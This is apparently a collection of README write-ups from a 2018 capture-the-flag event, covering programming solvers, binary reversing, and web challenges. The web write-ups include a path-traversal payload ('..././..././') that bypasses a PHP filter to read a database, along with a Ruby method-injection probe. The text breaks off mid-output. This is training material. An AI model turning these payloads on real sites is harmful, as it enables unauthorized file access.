+,+, ,+,+,+, ,+, ,+,+,+, ,+, ,+, ,+, ,+,+,+, ,+,+,+,+,+,+,+,+,+, ,+, ,+,+,+, ,+, ,+,+,+, ,+,+,+,+,+,+,+, ,+,+,+, ,+,+,+,+,+,+,+,+,+, ,+, ,+,+,+,+,+, ,+,+,+, ,+,+,+,+,+,+,+, ,+,+
+,+, , , , , ,+, , , , , ,+, , , ,+, , , ,+, , , ,+, , , , , , , ,+, , , ,+, ,+, , , , , ,+, , , ,+, , , , , ,+, ,+, , , ,+, , , , , ,+, , , , , , , ,+, ,+, , , , , , , , , ,+,+
+,+,+,+,+,+,+,+,+,+, ,+,+,+,+,+,+,+,+,+, ,+,+,+, ,+, ,+,+,+,+,+,+,+,+,+, ,+, ,+,+,+,+,+,+,+, ,+, ,+, ,+,+,+, ,+, ,+, ,+, ,+, ,+,+,+, ,+,+,+,+,+,+,+,+,+, ,+,+,+,+,+,+,+,+,+, ,+,+
S, , , , ,+, , , , , ,+, , , , , , , , , ,+, , , ,+, ,+, , , , , , , , , ,+, , , , , , , ,+, ,+, ,+, ,+, ,+, ,+, , , ,+, ,+, ,+, , , ,+, , , , , , , ,+, , , , , , , ,+, , , ,+,+
+,+,+,+, ,+,+,+,+,+,+,+, ,+,+,+,+,+,+,+,+,+, ,+,+,+, ,+, ,+,+,+,+,+,+,+,+,+, ,+,+,+,+,+, ,+, ,+, ,+, ,+, ,+, ,+,+,+,+,+, ,+, ,+, ,+,+,+, ,+,+,+,+,+, ,+,+,+, ,+,+,+, ,+, ,+,+,+,+
+,+, , , ,+, , , ,+, , , ,+, , , , , , , ,+, ,+, , , ,+, ,+, , , , , , , ,+, ,+, , , , , ,+, ,+, , , ,+, ,+, ,+, , , ,+, ,+, ,+, , , ,+, , , ,+, ,+, , , ,+, ,+, , , ,+, , , ,+,+
+,+, ,+,+,+, ,+, ,+, ,+,+,+, ,+, ,+,+,+, ,+, ,+,+,+, ,+, ,+,+,+, ,+,+,+, ,+, ,+,+,+,+,+, ,+, ,+,+,+,+,+, ,+, ,+, ,+,+,+, ,+, ,+, ,+,+,+,+,+, ,+, ,+,+,+, ,+, ,+, ,+,+,+,+,+, ,+,+
+,+, ,+, , , ,+, , , ,+, ,+, ,+, ,+, , , ,+, , , , , ,+, , , ,+, , , ,+, ,+, ,+, , , ,+, , , ,+, , , , , , , ,+, , , ,+, ,+, ,+, ,+, , , ,+, , , , , ,+, ,+, ,+, , , , , , , ,+,+
+,+, ,+,+,+, ,+,+,+,+,+, ,+, ,+, ,+,+,+, ,+,+,+,+,+,+,+,+,+, ,+, ,+,+,+, ,+, ,+, ,+, ,+,+,+,+,+,+,+,+,+, ,+,+,+,+,+, ,+, ,+, ,+,+,+, ,+, ,+,+,+,+,+, ,+, ,+, ,+,+,+,+,+,+,+,+,+,+
+,+, , , ,+, ,+, , , , , ,+, ,+, , , ,+, , , , , , , ,+, , , ,+, ,+, , , ,+, ,+, ,+, ,+, , , , , , , ,+, , , , , , , ,+, ,+, , , , , ,+, , , ,+, , , ,+, ,+, , , ,+, , , , , ,+,+
+,+,+,+, ,+, ,+, ,+,+,+,+,+, ,+,+,+, ,+,+,+,+,+, ,+,+,+, ,+,+,+,+,+, ,+, ,+, ,+, ,+, ,+, ,+,+,+,+,+, ,+,+,+,+,+,+,+, ,+, ,+,+,+,+,+, ,+, ,+,+,+, ,+,+,+, ,+,+,+, ,+, ,+,+,+,+,+,+
+,+, , , ,+, ,+, , , ,+, , , ,+, ,+, , , ,+, , , ,+, , , ,+, , , , , ,+, ,+, ,+, ,+, , , ,+, , , ,+, , , ,+, , , , , ,+, , , , , ,+, ,+, , , , , , , ,+, ,+, ,+, ,+, , , , , ,+,+
+,+, ,+,+,+, ,+, ,+, ,+, ,+,+,+, ,+,+,+, ,+,+,+,+,+, ,+,+,+,+,+, ,+,+,+, ,+, ,+, ,+,+,+,+,+, ,+, ,+,+,+, ,+,+,+,+,+,+,+,+,+,+,+, ,+,+,+,+,+,+,+,+,+, ,+, ,+, ,+, ,+, ,+,+,+, ,+,+
+,+, , , , , ,+, ,+, , , ,+, , , ,+, , , ,+, , , , , ,+, , , ,+, ,+, ,+, ,+, , , ,+, , , ,+, ,+, ,+, , , ,+, , , , , , , , , ,+, , , , , , , ,+, , , ,+, ,+, , , ,+, ,+, , , ,+,+
+,+,+,+,+,+,+,+, ,+,+,+,+,+,+,+, ,+, ,+,+,+, ,+,+,+,+,+, ,+, ,+, ,+, ,+, ,+,+,+,+,+, ,+, ,+, ,+, ,+, ,+,+,+, ,+,+,+,+,+,+,+, ,+,+,+,+,+,+,+, ,+,+,+,+,+, ,+, ,+,+,+,+,+, ,+, ,+,+
+,+, , , , , , , , , , , , , , , ,+, , , , , , , , , , , ,+, , , ,+, , , , , , , , , ,+, , , ,+, ,+, , , , , , , , , , , ,+, , , , , , , , , , , , , , , ,+, , , , , , , ,+, ,+,+
+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+
```

The user is given a CSV maze, where " " stands for a passage, "+" for a wall, "S" for start and "E" for exit. He has to find a way to solve the maze. This can be done using Depth-First Search<sup>[1]</sup>. You start by exploring a random path, stacking cells and marking them visited as you traverse them, and when confronted to a dead-end, backtrack by popping cells until you find yourself able to explore another unvisited cell. Repeat until you get to the exit.

Here's an excerpt of the source code illustrating the backtracking algorithm:

```python
def solve(m: Maze) -> List[Cell]:
    start = [ c for c in m.cells() if c.val is "S" ][0]
    stack = [ start ]

    cell = stack.pop()
    while cell.val is not "E":
        cell.visited = True
        neighbors = [ c for c in m.neighbors(cell, 1) 
                if c.val is not "+" and not c.visited ]

        if len(neighbors) > 0:
            stack.append(cell)
            stack.append(neighbors[0])

        cell = stack.pop()
    
    return stack
```

From there it's only a matter of connecting via a socket, parsing the maze, and sending back the path in the proper format. Example of this can be found scattered between `src/client.py` (which spits out the flag), `src/solver.py` (which implements logic) and `src/maze.py` (for shared utilities). You then get rewarded with the flag:

`CFI{85AEAEB2534F45A4931117C5CEA07348}`

refs:

1. https://en.wikipedia.org/wiki/Depth-first_search



### File: 2018-CFI-CTF/README.md

# 2018 CFI CTF

> September 24 00:01 to October 1 23:59

Source code files and writeups of the **2018 CFI CTF**'s challenges.

:triangular_flag_on_post: Flag format: `CFI\{[a-zA-Z0-9_]+\}`


## Scoreboard

[http://cfiul.ca/2018-CFI-CTF/](http://cfiul.ca/2018-CFI-CTF/)


## Challenges by category

- Programming
  - [Maths](./maths/)
  - [Guess the Number](./guess_the_number/)
  - [Labyrinth](./Labyrinth/)
  - [Serverless CFI λ](./serverless_cfi_λ/)
  - [Equation Solving](./equation_solving/)

- Web
  - [Awesome Cats](./awesome-cats/)
  - [Hacking Tool](./hacking-tool/)
  - [EZ Flag](./ez_flag_cfi/)
  - [Magic Word](./magic_word/)
  - [Fuck](./fuck/)
  - [Cheese Factory](./cheese-factory/)

- Mobile
  - [CFI-in-Kotlin](./CFI-in-Kotlin/)
  - [FlagCollection Part 1](./FlagCollection/)
  - [FlagCollection Part 2](./FlagCollection/)
  - [FlagCollection Part 3](./FlagCollection/)

- Crypto
  - [Hercule](./hercule/)
  - [Dayjavous](./dayjavous/)
  - [Congolexicomatisation](./Congolexicomatisation/)
  - [Chinese Food](./Chinese_Food/)
  - [Thirteen Steps](./thirteen-steps/)

- Forensics
  - [Web Logon Capture](./WebLogon-capture/)
  - [Kadyrov's Cat](./kadyrov_cat/)
  - [Windows XP Memory Part 1](./windows_xp_mem_part1/)
  - [Windows XP Memory Part 2](./windows_xp_mem_part2/)
  - [Unix Drive](./unix_drive/)

- Reverse
  - [Intro to PE](./introToPe/)
  - [PowerPacker](./powerPacker/)
  - [Automated Reversing](./automated_reversing/)

- Reverse
  - [Intro to PE](./introToPe/)
  - [PowerPacker](./powerPacker/)
  - [Automated Reversing](./automated_reversing/)

- Final
  - [SOHOpelesslyBroken](./SOHOpelesslyBroken/) 


## License

MIT



### File: 2018-CFI-CTF/SOHOpelesslyBroken/README.md

# SOHOpelesslyBroken

> web

Author: [corb3nik](https://github.com/Corb3nik)

http://localhost:50500


## Setup

Requirements:
- docker

Start:

```shell
docker-compose up
```

## Writeup

Coming soon.



### File: 2018-CFI-CTF/automated_reversing/README.md

# Automated Reversing

> reverse

Author: [corb3nik](https://github.com/Corb3nik)

I have 1009 binaries for you to reverse. Shouldn't take you that long right?

Have fun!

## Writeup

This challenge required participants to reverse about 1000 binaries.

The key to this challenge is the fact that all of the binaries have the same structure, making it easy for us to automate the reversing process.


### Reversing a binary
Let's take a look at a binary. Here I'm using `objdump` on OSX.

```
$ objdump -d binary0 --x86-asm-syntax=intel

binary0:        file format ELF64-x86-64

Disassembly of section .shellcode:
.shellcode:
  6000b0:       6a 00   push    0
  6000b2:       6a 05   push    5
  6000b4:       48 89 e7        mov     rdi, rsp
  6000b7:       48 c7 c0 23 00 00 00    mov     rax, 35
  6000be:       0f 05   syscall
  6000c0:       58      pop     rax
  6000c1:       58      pop     rax
  6000c2:       48 8b 44 24 10  mov     rax, qword ptr [rsp + 16]
  6000c7:       8a 10   mov     dl, byte ptr [rax]
  6000c9:       80 f2 57        xor     dl, 87
  6000cc:       80 fa 5d        cmp     dl, 93
  6000cf:       75 10   jne     16 <.shellcode+0x31>
  6000d1:       48 c7 c7 00 00 00 00    mov     rdi, 0
  6000d8:       48 c7 c0 3c 00 00 00    mov     rax, 60
  6000df:       0f 05   syscall
  6000e1:       48 c7 c7 01 00 00 00    mov     rdi, 1
  6000e8:       48 c7 c0 3c 00 00 00    mov     rax, 60
  6000ef:       0f 05   syscall
  6000f1:       00  <unknown>
```

The first lines of this binary calls syscall #35, which is `nanosleep`.
You can find syscall definitions here : http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/.
```
  6000b0:       6a 00   push    0
  6000b2:       6a 05   push    5
  6000b4:       48 89 e7        mov     rdi, rsp
  6000b7:       48 c7 c0 23 00 00 00    mov     rax, 35
  6000be:       0f 05   syscall
```

Then, we are taking the first character located at `[rsp+16]` and moving it into `dl`:

```
  6000c2:       48 8b 44 24 10  mov     rax, qword ptr [rsp + 16]
  6000c7:       8a 10   mov     dl, byte ptr [rax]
```

To figure out what is located at `[rsp+16]`, we can run it through a debugger and
find out. At `0x6000c2`, the stack looks like the following :

```
rsp       => argc
rsp + 8   => argv[0]
rsp + 16  => argv[1]
```

Therefore, we are moving the first char of argv[1] into the `dl` register.

We are then running the `xor` operation on `dl` and the number `87` :

```
  6000c9:       80 f2 57        xor     dl, 87
```

The result of that operation is checked against the number 93 :
```
  6000cc:       80 fa 5d        cmp     dl, 93
```

Depending on the result above, the binary will exit with return code 0 or 1:

```
  6000cf:       75 10   jne     16 <.shellcode+0x31>
  6000d1:       48 c7 c7 00 00 00 00    mov     rdi, 0
  6000d8:       48 c7 c0 3c 00 00 00    mov     rax, 60
  6000df:       0f 05   syscall
  6000e1:       48 c7 c7 01 00 00 00    mov     rdi, 1
  6000e8:       48 c7 c0 3c 00 00 00    mov     rax, 60
  6000ef:       0f 05   syscall
```

By convention, a successful exit status is `0`. Therefore, our goal is to figure out
which input
The goal is to find which input will result in an exit status of 0.

Based on our example above, to obtain the exit status of 0, we need to solve the
following equation : `dl ^ 87 = 93`. We can reverse the operation :

```
>>> 93 ^ 87
10
```

The answer here is 10, which is a newline in ascii.

### Reversing 1000 binaries

Upon reversing 2/3 binaries, you'll notice that each binary follows the same
structure.

In each binary, only three elements will differ :

- The operation to use (xor, sub or add)
- The 2nd operand of the operation : `xor dl, random_number_here`
- The final check : `cmp dl, some_number`

Knowing this, we can create a script in order to determine the value of `dl` to use
for each binary :

```
#!/usr/bin/env python

flag = ""
for i in xrange(970):
    path = "binaries/binary{}".format(i)
    print i
    with open(path, "r") as f:
        binary = f.read()
        operator = binary[0xca]
        key = binary[0xcb]
        check = binary[0xce]

        if operator == "\xc2": # add
            flag += chr((ord(check) - ord(key)) & 0xff)

        elif operator == "\xea": # sub
            flag += chr((ord(check) + ord(key)) & 0xff)

        else:
            flag += chr(ord(check) ^ ord(key))

print flag
```

By concatenating the `dl` value of each binary, we obtain the flag :

```
$ python solution.py

Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula dolor. Aenean massa. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Donec quam felis, ultricies nec, pellentesque eu, pretium quis, sem. Nulla consequat massa quis enim. Donec pede justo, fringilla vel, aliquet nec, vulputate eget, arcu. In enim justo, rhoncus ut, imperdiet a, venenatis vitae, justo. Nullam dictum felis eu pede mollis pretium. Integer tincidunt. Cras dapibus. The flag is CFI{1s_th1s_4_pr0g_ch4ll_0r_4_r3ve3se_ch4ll?}. Aenean vulputate eleifend tellus. Aenean leo ligula, porttitor eu, consequat vitae, eleifend ac, enim. I stole this idea directly from Defcon Quals 2016. Phasellus viverra nulla ut metus varius laoreet. Quisque rutrum. Aenean imperdiet. Etiam ultricies nisi vel augue. Curabitur ullamcorper ultricies nisi. Nam eget dui. Etiam rhoncus. Maecenas tempus, tellus eget condimentum rhoncus, sem quam semper libero, si
```



### File: 2018-CFI-CTF/awesome-cats/README.md

# awesome-cats 🐈

> web

Author: [lilc4t](https://github.com/masterT)

My collection of awesome cats.

http://localhost:12001/


## Setup

Requirements:
- docker

Start:

```shell
docker-compose up
```

## Writeup

Go to the `/index.html`, check the source code.

Nothing interesting.

Visit the other pages accessible from `/index.html`, check the source code.

Nothing interesting either.

Do some reconnaissance and you'll find the `robots.txt`:

```
# http://www.robotstxt.org/

User-agent: *

Allow: index.html

# Add pages under construction to start indexing them.
Allow: cats-best.html
Allow: cats-cute.html
Allow: cats-fat.html
Allow: cats-and-mouse.html

# Hide old versions.
Disallow: /index-last.html
Disallow: /index-very-last.html
Disallow: /index2.html
Disallow: /index3.html
Disallow: /index4.html

# Hide dev. stuff.
Disallow: /README.md
Disallow: /LICENSE
Disallow: /src/assets/stylesheets/*.scss

# Hide blast from the past.
Disallow: /static/assets/images/dog-*
Disallow: /index-old.html
Disallow: /old/index.html

# I don't want bots to index my private stuff.
Disallow: /secret/notes.md
Disallow: /secret/secret.md
Disallow: /secret/todo.md
Disallow: /secret/journal.md
Disallow: /secret/javascript.html
```

The flag is in the `/secret/journal.md`:

`CFI{nothing_sensitive_goes_in_robots.txt}`



### File: 2018-CFI-CTF/awesome-cats/src/README.md

# Awesome Cats 🐈

> Cats are the kings of the animal kingdom.

## instructions

1. Love ❤️ cats, and only cats.
2. Open `index.html` in your browser.
3. Enjoy!

## requirements

- ruby
- rubygems

## development

Install gem [sass][https://rubygems.org/gems/sass].

```bash
gem install sass
```

Compile the CSS files.

```bash
sass src/assets/stylesheets/style.scss static/assets/stylesheets/style.css
```

Compile the CSS files and watch for changes.

```bash
sass --watch src/assets/stylesheets/style.scss:static/assets/stylesheets/style.css
```

## license

No license, but don't steal my code please.


### File: 2018-CFI-CTF/cheese-factory/README.md

# cheese-factory 🧀 🏭

> web

Author: [lilc4t](https://github.com/masterT)

We make good cheeses, some smell, some don't, in all cases they're good.

http://localhost:12080/


## Setup

Requirements:
- docker

Start:

```shell
docker-compose up
```

## Writeup

### Recon

Visit the website and inspect the page and them source code.

It looks like it includes _php_ file. This means that we might be able to exploit a  [LFI](https://en.wikipedia.org/wiki/File_inclusion_vulnerability) (local file inclusion).

```
/?page=home.php
/?page=about.php
/?page=contact.php
```

Also after each "cheese" HTML block there is the comment `<!-- secret: 0 -->`. There might be a _secret_ cheese or something like that.

Let's check if there is a `/robots.txt`. Yes there is one.

```
User-agent: *
Disallow: /README.md
Disallow: /LICENSE
```

Visit `/README.md`.

```md
# The Cheese Factory

Very easy to setup the website. The cheeses are stored in an SQLite database.

## Requirements

- PHP

## Config

The entry point of the website is `./index.php`.

Modify config values in `./application/config/config.php`.

- error reporting level
- database path
- pages
- default page
- security
- etc.


### Current config recap

<!-- Too lazy to write proper sentences, just pasted the current config -->

$config = array();

// Environment
// $config['environment'] = 'production';
$config['environment'] = 'development';

// Security
$config['secure'] = true;

// Error reporting.
if ($config['environment'] === 'production') {
	ini_set('display_errors', 0);
	error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
}


// Database.
$config['database-path'] = dirname(__FILE__) . '/../database/the-cheese-factory.db';
$config['db'] = new SQLite3($config['database-path']);

// Pages
$config['pages'] = array('home.php', 'about.php', 'contact.php');
$config['default-page'] = $config['pages'][0];
```

There is a lot of information here.

First it gives the location of some sensible files:

- entry `index.php`
- config `application/config/config.php`
- database `application/database/the-cheese-factory.db`

We also know there is `$config['secure']` enabled.

Finally the error reporting is not disabled.

Let's finish our recon and visit `/LICENSE`.

```
No LICENSE
```

Ok nothing interesting here.


### Exploitation

Now it's time to try exploit the possible LFI.

Let's try to break the `page` system and display an error message.

http://localhost:12080/?page=foobar

```
<!-- ... -->
Warning: include(./application/views/foobar): failed to open stream: No such file or directory in /var/www/html/index.php on line 73

Warning: include(): Failed opening './application/views/foobar' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 73
<!-- ... -->
```

It looks like it tries to [include](http://php.net/manual/en/function.include.php) the file given by the param `page` in the directory `application/views`.

Let's try to include the `LICENSE` file.

http://localhost:12080/?page=../../LICENSE

```
<!-- ... -->
Warning: include(./application/views/LICENSE): failed to open stream: No such file or directory in /var/www/html/index.php on line 73

Warning: include(): Failed opening './application/views/LICENSE' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 73
<!-- ... -->
```

what the heck? It looks like it striped the `../../`.

Let's try with specifying the current directory.

http://localhost:12080/?page=./../../LICENSE

```
<!-- ... -->
Warning: include(./application/views/./LICENSE): failed to open stream: No such file or directory in /var/www/html/index.php on line 73

Warning: include(): Failed opening './application/views/./LICENSE' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 73
<!-- ... -->
```

It looks like it only stripped the `../` from the `page` param.

Let's try to isolate the behaviour.

http://localhost:12080/?page=foo/../bar

```
<!-- ... -->
Warning: include(./application/views/foo/bar): failed to open stream: No such file or directory in /var/www/html/index.php on line 73

Warning: include(): Failed opening './application/views/foo/bar' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 73
<!-- ... -->
```

Ok it seem to only replace the `../`.

It we want to bypass this system we need to create a `page` params that we equals to `../../LICENSE` after we would remove all `../` from it.

To do it we can insert `../` between each `../`.

1. `../../LICENSE`
2. `..././../LICENSE` (insert `../` at index 1)
3. `..././..././LICENSE` (insert `../` at index 7)

http://localhost:12080/?page=..././..././LICENSE


```
<!-- ... -->
No LICENSE
<!-- ... -->
```

Yeah!

Now let's read the content of the database.

http://localhost:12080/?page=..././..././application/database/the-cheese-factory.db

```
<!-- ... --->
SQLite format 3@  .Y
����P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�A�YtablecheesescheesesCREATE TABLE cheeses (
id INTEGER PRIMARY KEY AUTOINCREMENT,
name TEXT NOT NULL UNIQUE,
description TEXT NOT NULL,
image TEXT NOT NULL,
secret TINYINT NOT NULL
)-Aindexsqlite_autoindex_cheeses_1cheeses

9�
�t
9�d'�U�c	Secret CheeseThe most delicious cheese. Made with the secret ingredient CFI{local_file_inclusion_tastes_so_good}.https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Red_flag_waving.svg/249px-Red_flag_waving.svg.png�Q�7�kGoudaGouda is a mild, yellow cheese made from cow's milk. It is one of the most popular cheeses worldwide. The name is used today as a general term for numerous similar cheeses produced in the traditional Dutch manner.https://upload.wikimedia.org/wikipedia/commons/thumb/f/fb/Smoked_gouda_cheese.jpg/800px-Smoked_gouda_cheese.jpg�:!�C�'MozzarellaMozzarella is a traditionally southern Italian cheese made from Italian buffalo's milk by the pasta filata method. Mozzarella received a Traditional Specialities Guaranteed certification from the European Union in 1998.https://upload.wikimedia.org/wikipedia/commons/5/57/Mozzarella_di_bufala3.jpg�|�G�)CamembertCamembert is a moist, soft, creamy, surface-ripened cow's milk cheese. It was first made in the late 18th century at Camembert, Normandy, in northern France.https://upload.wikimedia.org/wikipedia/commons/4/4d/Camembert_%28Cheese%29.jpg�M�U�=RoquefortRoquefort is a sheep milk cheese from the south of France, and together with Bleu d'Auvergne, Stilton, and Gorgonzola is one of the world's best known blue cheeses.https://upload.wikimedia.org/wikipedia/commons/thumb/b/bf/Wikicheese_-_Roquefort_-_20150417_-_003.jpg/1920px-Wikicheese_-_Roquefort_-_20150417_-_003.jpg
������'Secret Cheese	Gouda!Mozzarella
Camembert	Roquefort
��cheeses
<!-- ... --->
```

Even if we can't recreate the database from this, the content is still readable.

```
CFI{local_file_inclusion_tastes_so_good}
```

🚩



### File: 2018-CFI-CTF/cheese-factory/src/README.md

# The Cheese Factory

Very easy to setup the website. The cheeses are stored in an SQLite database.

## Requirements

- PHP

## Config

The entry point of the website is `./index.php`.

Modify config values in `./application/config/config.php`.

- error reporting level
- database path
- pages
- default page
- security
- etc.


### Current config recap

<!-- Too lazy to write proper sentences, just pasted the current config -->

$config = array();

// Environment
// $config['environment'] = 'production';
$config['environment'] = 'development';

// Security
$config['secure'] = true;

// Error reporting.
if ($config['environment'] === 'production') {
	ini_set('display_errors', 0);
	error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
}


// Database.
$config['database-path'] = dirname(__FILE__) . '/../database/the-cheese-factory.db';
$config['db'] = new SQLite3($config['database-path']);

// Pages
$config['pages'] = array('home.php', 'about.php', 'contact.php');
$config['default-page'] = $config['pages'][0];



### File: 2018-CFI-CTF/dayjavous/README.md

# Dayjavous

> web

Author: [corb3nik](https://github.com/Corb3nik)

Are you allowed to view the flag?

You'll need this : https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Counter_(CTR)

## Setup

Requirements:
- docker

Start:

```shell
docker-compose up
```

## Writeup

Coming soon.




### File: 2018-CFI-CTF/equation_solving/README.md

# equation_solving

> programming

Author: [filedesless](https://github.com/filedesless)

The user is presented with an equation with missing operators. He has to find a combination of operators satisfying the given equation.


## Setup

Requirements:
- docker

Start:

```shell
docker-compose up
```

## Writeup

Example for the socket code can be found in `src/solution.py`. The "logic" is in the `solve()` function in `src/equation.py`.

It's basically a brute force of all the possible operator combinations

```python
from itertools import product
# ...

def solve(chall):
    s, _, goal = chall.partition(" => ")
    comb = product(ops.values(), repeat=s.count("?"))
    for guess in comb:
        i = iter(guess)
        attempt = "".join([ c if c is not "?" else next(i) for c in s ])
        e = Expression.fromstring(attempt)
        try: 
            if int(e) == int(goal):
                break
        except ZeroDivisionError:
            pass
```

Here `Expression.fromstring()` parses the string into an `Expression`, basically a binary tree where each nodes has an operator and two sub-expressions left and right.



### File: 2018-CFI-CTF/ez_flag_cfi/README.md

# EZ Flag CFI

> web

Author: [corb3nik](https://github.com/Corb3nik)

http://localhost:17000


## Setup

Requirements:
- docker

Start:

```shell
docker-compose up
```

## Writeup

This challenge was an encoding exercice.
The goal was to access a file which name contained a few special characters.

```
http://localhost:17000/can_y#u_get_the_flag?!
```

In the HTTP specifications, a couple of characters are reserved and have
special meaning : https://www.w3.org/Protocols/HTTP/1.0/spec.html#URI-syntax

In our case, the characters `#` and `?` have a particular significance and
are interpreted differently by the browser and web server.

To prevent these characters from being interpreted, the solution is to
[URL-encode them](https://meyerweb.com/eric/tools/dencoder/).

By encoding them, we obtain `http://localhost:17000/can_y%23u_get_the_flag%3f!`,
which when visited will give you the flag.

```
// Good job!
// Keep this in mind when doing web challenges ;)
// https://www.w3.org/Protocols/HTTP/1.0/spec.html#URI-syntax
CFI{y0u_4r3_3l_3nc0d1ngs}
```



### File: 2018-CFI-CTF/fuck/README.md

# Fuck

> web

Author: [corb3nik](https://github.com/Corb3nik)

This is the most secure login form on earth.

We use SECURITY BY OBSCURITY in order to prevent hackers from finding our flags.

I dare you to login : http://localhost:17002

## Setup

Requirements:
- docker

Start:

```shell
docker-compose up
```

## Writeup

This challenge requires us to find the username/password used in the login form.

When checking the source code of the HTML page, you'll see the following function.

```
function validate() {
  [][(![]+[])[+[]]+([![]] ...
}
```

At first, this doesn't seem like valid JavaScript. In fact, this is obfuscated
JavaScript resulting directly from a tool called [JSFuck](http://www.jsfuck.com/).

The gist of JSFuck is : using only 6 characters, we can create any character/string. It is also possible to obtain various objects/constructors through these same
6 characters. This allows us to create full working JavaScript scripts using only 6 chars.

You can see how its done here : https://github.com/aemkei/jsfuck/blob/master/jsfuck.js

To solve the challenge, we can paste the challenge script
into [JSUnfuck](http://codertab.com/JsUnFuck), revealing the following code :

```
if (document.forms[0].username.value == "corb3nik" && document.forms[0].password.value == "chickenachos") document.location = "4d4932602a75414640946d38ea6fefbf.php"
```

The flag is located at http://localhost:17002/4d4932602a75414640946d38ea6fefbf.php



### File: 2018-CFI-CTF/guess_the_number/README.md

# Guess the number

> programming

Author: [filedesless](https://github.com/filedesless)

`localhost:24000`

I'm thinking of a number between 0 and 4294967296
You have 40 tries to guess it

Here are some interesting reads: 

 - https://docs.python.org/3/library/socket.html
 - https://en.wikipedia.org/wiki/Algorithm


## Setup

Requirements:
- docker

Start:

```shell
docker-compose up
```

## Writeup

The challenge is a service running on port 24000, the user have to connect to it with a tool like netcat.

```
λ $ nc localhost 24000
I'm thinking of a number x such that 0 <= x <= 4294967296
You have 40 tries to guess it :)
```

A binary search in a range `n = 2**32` can be ran in about `log_2(n)` operations. The idea is to always cut the search space in half like the following pseudo-code<sup>1</sup>:

```
function binary_search(A, n, T):
    L := 0
    R := n − 1
    while L <= R:
        m := floor((L + R) / 2)
        if A[m] < T:
            L := m + 1
        else if A[m] > T:
            R := m - 1
        else:
            return m
    return unsuccessful
```

Here's an example of a working python solution; we basically connect to the server, and start guessing in the middle of the search space, lower bound at 0 and upper bound at 2 ** 32. Then we increase the lower bound or decrease the upper bound by half the remaining search space size per iteration.

```python
#!/usr/bin/env python3

import socket

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect(("127.0.0.1", 24000))

tries = 0

res = soc.recv(4096).decode()
print(res)
l, r = 0, 2 ** 32 - 1

while l <= r and "CFI" not in res:
    guess = l + (r - l) // 2
    clients_input = f"{guess}".encode()
    print(f"> {clients_input}")

    soc.send(clients_input) # we must encode the string to bytes
    tries += 1
    result_bytes = soc.recv(4096) # the number means how the response can be in bytes
    res = result_bytes.decode("utf8") # the return will be in bytes, so decode
    print(f"< {res}")

    if "high" in res:
        r = guess - 1
    elif "low" in res:
        l = guess + 1
```


Here's a flag for your trouble :)

`CFI{9F1B64A9D28E47B89A110CB360AADABD}`


refs:

  1. https://en.wikipedia.org/wiki/Binary\_search\_algorithm


### File: 2018-CFI-CTF/hacking-tool/README.md

# Hacking Tool 🛠

> web

Author: [lilc4t](https://github.com/masterT)

This is my custom hacking tool, very useful during CTFs 🚩!

http://localhost:23200/


## Setup

Requirements:
- docker

Start:

```shell
docker-compose up
```

## Writeup

The page as a form has 4 inputs:
- message
- option (commented)
- method

Here is the source code:

```html
<form action="/" method="POST">
  <textarea autofocus name="message"></textarea>
  <!-- <input type="text" name="option"/> -->
  <br>
  <select name="method">
      <option value="decode_base64">Decode base64</option>
      <option value="encode_base64">Encode base64</option>
      <option value="encode_hexadecimal">Encode hexadecimal</option>
      <option value="decode_hexadecimal">Decode hexadecimal</option>
      <option value="md5">Md5</option>
      <option value="sha1">Sha1</option>
      <option value="sha2">Sha2</option>
  </select>
  <input type="submit">
  <hr/>
  <textarea></textarea>
</form>
```

Here is a normal request payload:

```
message=test&method=encode_base64
```

And it's response:

```html
<!-- ... -->
  <textarea>dGVzdA==
</textarea>
<!-- ... -->
```

It looks like it performs the action specify by the `method` param on the `message` param.  In this case encode `test` in base 64.

Now let's try to break it!

Request payload:

```
message=test&method=foobar
```

Response:

```html
<!-- ... -->
  <textarea></textarea>
   <!-- <div class="error">undefined method `foobar' for Tool:Class</div> -->
<!-- ... -->
```

We have an error message!

After some research on the internet you can figure out that the language used is [Ruby](https://www.ruby-lang.org).

It can be code injection if the param `method` is the method name called on the `Tool` class.

Let's try it with the [methods](https://ruby-doc.org/core-2.2.0/Object.html#method-i-methods) method. It should return an array with the methods symbol defined for this class.


```
message=test&method=methods
```

```html
<!-- ... -->
  <textarea>[:decode_base64, :encode_base64, :encode_hexadecimal, :decode_hexadecimal, :md5, :sha1, :sha2, :exposed_methods, :new, :allocate, :superclass, :json_creatable?, :<=>, :include, :<=, :>=, :==, :===, :included_modules, :include?, :name, :ancestors, :instance_methods, :public_instance_methods, :protected_instance_methods, :private_instance_methods, :constants, :const_get, :const_set, :const_defined?, :class_variables, :remove_class_variable, :class_variable_get, :class_variable_set, :class_variable_defined?, :public_constant, :private_constant, :deprecate_constant, :singleton_class?, :module_exec, :class_exec, :freeze, :inspect, :const_missing, :class_eval, :method_defined?, :public_method_defined?, :prepend, :<, :>, :private_method_defined?, :protected_method_defined?, :public_class_method, :module_eval, :to_s, :private_class_method, :autoload, :autoload?, :instance_method, :public_instance_method, :to_json, :instance_of?, :kind_of?, :is_a?, :tap, :public_send, :method, :public_method, :singleton_method, :remove_instance_variable, :define_singleton_method, :instance_variable_set, :extend, :to_enum, :enum_for, :=~, :!~, :eql?, :respond_to?, :object_id, :send, :display, :nil?, :hash, :class, :singleton_class, :clone, :dup, :itself, :taint, :tainted?, :untaint, :untrust, :untrusted?, :trust, 